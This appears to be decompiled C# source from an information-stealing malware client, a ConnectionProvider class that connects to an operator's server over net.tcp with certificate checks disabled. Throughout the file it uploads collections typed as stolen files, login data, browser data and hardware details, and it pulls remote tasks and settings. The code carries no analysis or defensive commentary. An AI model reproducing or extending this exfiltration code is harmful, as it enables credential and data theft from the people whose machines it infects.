using System;
using System.Collections.Generic;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.ServiceModel.Security;

// Token: 0x02000013 RID: 19
public class ConnectionProvider
{
	// Token: 0x0600005C RID: 92 RVA: 0x00002E2A File Offset: 0x0000102A
	public bool Id1(string address, string auth)
	{
		return this.RequestConnection(address, auth) && this.Id3();
	}

	// Token: 0x0600005D RID: 93 RVA: 0x00005814 File Offset: 0x00003A14
	public bool RequestConnection(string address, string auth)
	{
		bool result;
		try
		{
			IContextChannel contextChannel = new ChannelFactory<Entity>(SystemInfoHelper.CreateBind(), new EndpointAddress(new Uri("net.tcp://" + address + "/"), EndpointIdentity.CreateDnsIdentity("localhost"), new AddressHeader[0]))
			{
				Credentials = 
				{
					ServiceCertificate = 
					{
						Authentication = 
						{
							CertificateValidationMode = X509CertificateValidationMode.None
						}
					}
				}
			}.CreateChannel() as IContextChannel;
			this.connector = (contextChannel as Entity);
			new OperationContextScope(contextChannel);
			string value = auth;
			MessageHeader header = MessageHeader.CreateHeader("Authorization", "ns1", value);
			OperationContext.Current.OutgoingMessageHeaders.Add(header);
			result = true;
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600005E RID: 94 RVA: 0x000058CC File Offset: 0x00003ACC
	public bool Id3()
	{
		bool result;
		try
		{
			result = this.connector.Id1();
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0600005F RID: 95 RVA: 0x00005900 File Offset: 0x00003B00
	public bool Id4(Entity_CollectedResults result)
	{
		bool result2;
		try
		{
			this.connector.Id3(result);
			result2 = true;
		}
		catch (Exception)
		{
			result2 = false;
		}
		return result2;
	}

	// Token: 0x06000060 RID: 96 RVA: 0x00005934 File Offset: 0x00003B34
	public bool Id5(out Entity_Settings args)
	{
		bool result;
		try
		{
			args = new Entity_Settings();
			args = this.connector.Id2();
			result = true;
		}
		catch (Exception)
		{
			args = new Entity_Settings();
			result = false;
		}
		return result;
	}

	// Token: 0x06000061 RID: 97 RVA: 0x00005978 File Offset: 0x00003B78
	public Entity_ServerResponse Id6(Entity_CollectedResults result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id4(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000062 RID: 98 RVA: 0x000059AC File Offset: 0x00003BAC
	public Entity_ServerResponse Id7(byte[] result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id5(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000063 RID: 99 RVA: 0x000059E0 File Offset: 0x00003BE0
	public Entity_ServerResponse Id8(List<Entity_Browser> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id11(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000064 RID: 100 RVA: 0x00005A14 File Offset: 0x00003C14
	public Entity_ServerResponse Id9(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id15(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000065 RID: 101 RVA: 0x00005A48 File Offset: 0x00003C48
	public Entity_ServerResponse Id10(List<string> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id6(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000066 RID: 102 RVA: 0x00005A7C File Offset: 0x00003C7C
	public Entity_ServerResponse Id11(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id21(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000067 RID: 103 RVA: 0x00005AB0 File Offset: 0x00003CB0
	public Entity_ServerResponse Id12(List<Entity_LoginData> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id12(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000068 RID: 104 RVA: 0x00005AE4 File Offset: 0x00003CE4
	public Entity_ServerResponse Id13(List<Entity_HardwareInfo> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id10(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000069 RID: 105 RVA: 0x00005B18 File Offset: 0x00003D18
	public Entity_ServerResponse Id14(List<BrowserInfo> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id13(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600006A RID: 106 RVA: 0x00005B4C File Offset: 0x00003D4C
	public Entity_ServerResponse Id15(List<string> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id8(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600006B RID: 107 RVA: 0x00005B80 File Offset: 0x00003D80
	public Entity_ServerResponse Id16(List<string> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id7(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600006C RID: 108 RVA: 0x00005BB4 File Offset: 0x00003DB4
	public Entity_ServerResponse Id18(List<Entity_LoginData> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id17(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600006D RID: 109 RVA: 0x00005BE8 File Offset: 0x00003DE8
	public Entity_ServerResponse Id19(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id18(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600006E RID: 110 RVA: 0x00005C1C File Offset: 0x00003E1C
	public Entity_ServerResponse Id20(List<string> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id9(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x0600006F RID: 111 RVA: 0x00005C50 File Offset: 0x00003E50
	public Entity_ServerResponse Id21(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id19(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000070 RID: 112 RVA: 0x00005C84 File Offset: 0x00003E84
	public Entity_ServerResponse Id22(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id14(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000071 RID: 113 RVA: 0x00005CB8 File Offset: 0x00003EB8
	public Entity_ServerResponse Id23(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id16(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000072 RID: 114 RVA: 0x00005CEC File Offset: 0x00003EEC
	public Entity_ServerResponse Id24(List<Entity_StolenFile> result)
	{
		Entity_ServerResponse result2;
		try
		{
			result2 = this.connector.Id20(result);
		}
		catch (Exception)
		{
			result2 = Entity_ServerResponse.Id1;
		}
		return result2;
	}

	// Token: 0x06000073 RID: 115 RVA: 0x00005D20 File Offset: 0x00003F20
	public bool Id25()
	{
		bool result;
		try
		{
			this.connector.Id22();
			result = true;
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000074 RID: 116 RVA: 0x00005D54 File Offset: 0x00003F54
	public bool Id26(Entity_CollectedResults user, out IList<Entity_Task> remoteTasks)
	{
		bool result;
		try
		{
			remoteTasks = this.connector.Id23(user);
			result = true;
		}
		catch (Exception)
		{
			remoteTasks = new List<Entity_Task>();
			result = false;
		}
		return result;
	}

	// Token: 0x06000075 RID: 117 RVA: 0x00005D90 File Offset: 0x00003F90
	public bool Id27(Entity_CollectedResults user, int taskId)
	{
		bool result;
		try
		{
			this.connector.Id24(user, taskId);
			result = true;
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x0400000D RID: 13
	public Entity connector;
}
